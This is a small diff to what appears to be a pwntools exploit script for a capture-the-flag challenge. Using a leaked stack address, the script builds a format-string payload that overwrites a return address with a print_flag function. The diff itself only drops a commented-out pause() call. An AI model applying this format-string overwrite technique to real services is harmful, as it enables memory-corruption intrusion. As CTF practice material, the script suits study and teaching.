@@ -29,7 +29,7 @@ rbp_point_to=int(p.recvline().decode().strip(), 16)-8 #addr of lower bytes of re
 p.sendline("3")
 writes = {rbp_point_to: print_flag}
 payload = fmtstr_payload(6, writes)
-# pause()
 p.sendline(payload)
 
 p.interactive()
+
